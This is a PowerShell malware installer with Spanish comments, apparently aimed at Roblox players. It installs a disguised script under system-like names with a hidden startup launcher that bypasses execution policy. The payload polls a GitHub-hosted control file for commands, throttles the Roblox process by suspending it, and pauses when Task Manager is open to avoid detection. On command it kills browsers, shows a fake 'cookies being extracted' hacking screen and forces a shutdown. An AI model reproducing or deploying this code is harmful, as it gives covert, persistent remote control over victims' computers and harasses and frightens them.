# --- CONFIGURACIÓN DE RUTAS ---
$dir = "$env:LOCALAPPDATA\WinSystem"
if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force }

$psFile = "$dir\TaskHostWin.ps1"
$vbsFile = "$dir\Launcher.vbs"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinSystemUpdate.lnk"

# --- 1. MOTOR DE CONTROL (TaskHostWin.ps1) ---
# Usamos una técnica de unión de líneas para evitar el error del terminador '@
$c1 = '$controlUrl = "https://raw.githubusercontent.com/polgatiz/lox/main/control.txt"' + "`n"
$c2 = '$windowTitle = "*Roblox*"' + "`n"
$c3 = 'function MostrarHacker($l1, $l2) {' + "`n"
$c4 = '    $ascii = "   [SISTEMA HACKEADO] `n   ACCESO COMPROMETIDO `n   EXTRAYENDO COOKIES... [OK] `n   " + $l1 + "`n   " + $l2' + "`n"
$c5 = '    $pathS = "$env:TEMP\syserr.ps1"' + "`n"
$c6 = '    $cmd = "$Host.UI.RawUI.BackgroundColor=''Black'';$Host.UI.RawUI.ForegroundColor=''Red'';Clear-Host;Write-Host ''$ascii'';for(`$i=0;`$i -lt 10;`$i++){[Console]::Beep(200,150)};Read-Host ''ERROR CRITICO''"' + "`n"
$c7 = '    Set-Content -Path $pathS -Value $cmd -Force' + "`n"
$c8 = '    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass", "-File", "`"$pathS`"" -WindowStyle Maximized' + "`n"
$c9 = '}' + "`n"
$c10 = 'try { $api = "[DllImport(""ntdll.dll"")] public static extern uint NtSuspendProcess(IntPtr h); [DllImport(""ntdll.dll"")] public static extern uint NtResumeProcess(IntPtr h);"; Add-Type -TypeDefinition "using System; using System.Runtime.InteropServices; public class Win32 { $api }" -ErrorAction SilentlyContinue } catch {}' + "`n"
$c11 = 'while($true) {' + "`n"
$c12 = '    try { $raw = (Invoke-WebRequest -Uri $controlUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content.Trim(); $partes = $raw -split ''\|''; $comando = $partes[0] } catch { $comando = "OFF" }' + "`n"
$c13 = '    if ($comando -eq "OFF") { Start-Sleep -Seconds 30; continue }' + "`n"
$c14 = '    $roblox = Get-Process | Where-Object { $_.MainWindowTitle -like $windowTitle }' + "`n"
$c15 = '    if ($roblox) {' + "`n"
$c16 = '        $h = $roblox[0].Handle; $TargetProcessID = $roblox[0].Id' + "`n"
$c17 = '        switch ($comando) {' + "`n"
$c18 = '            "MSG" { $m = if($partes.Count -gt 1){$partes[1]}else{"Aviso"}; (New-Object -ComObject WScript.Shell).Popup($m, 0, "Windows System", 64) }' + "`n"
$c19 = '            "HACK" { Get-Process chrome, msedge, firefox -ErrorAction SilentlyContinue | Stop-Process -Force; $m1 = if($partes.Count -gt 1){$partes[1]}else{"SISTEMA SECUESTRADO"}; $m2 = if($partes.Count -gt 2){$partes[2]}else{"APAGADO EN 60S"}; MostrarHacker $m1 $m2; shutdown.exe /s /t 60 /c "Alerta de seguridad" }' + "`n"
$c20 = '        }' + "`n"
$c21 = '        $step = 1; while (Get-Process -Id $TargetProcessID -ErrorAction SilentlyContinue) {' + "`n"
$c22 = '            if (Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue) { [Win32]::NtResumeProcess($h); Start-Sleep -Seconds 5; continue }' + "`n"
$c23 = '            $ints = if($comando -eq "HACK"){ 99 } else { [math]::Min(98, ($step / 300) * 98) }' + "`n"
$c24 = '            [Win32]::NtSuspendProcess($h); Start-Sleep -Milliseconds $ints; [Win32]::NtResumeProcess($h); Start-Sleep -Milliseconds (100 - $ints); $step++' + "`n"
$c25 = '        }' + "`n"
$c26 = '    }' + "`n"
$c27 = '    Start-Sleep -Seconds 15' + "`n"
$c28 = '}'

$psContent = $c1+$c2+$c3+$c4+$c5+$c6+$c7+$c8+$c9+$c10+$c11+$c12+$c13+$c14+$c15+$c16+$c17+$c18+$c19+$c20+$c21+$c22+$c23+$c24+$c25+$c26+$c27+$c28

# --- 2. LANZADOR INVISIBLE (Launcher.vbs) ---
$vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.Run "powershell.exe -ExecutionPolicy Bypass -File ""' + $psFile + '""", 0, False'

# --- 3. GUARDAR Y CONFIGURAR ---
Set-Content -Path $psFile -Value $psContent -Force
Set-Content -Path $vbsFile -Value $vbsContent -Force

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($startupPath)
$Shortcut.TargetPath = "wscript.exe"
$Shortcut.Arguments = "`"$vbsFile`""
$Shortcut.Save()

Start-Process "wscript.exe" -ArgumentList "`"$vbsFile`""
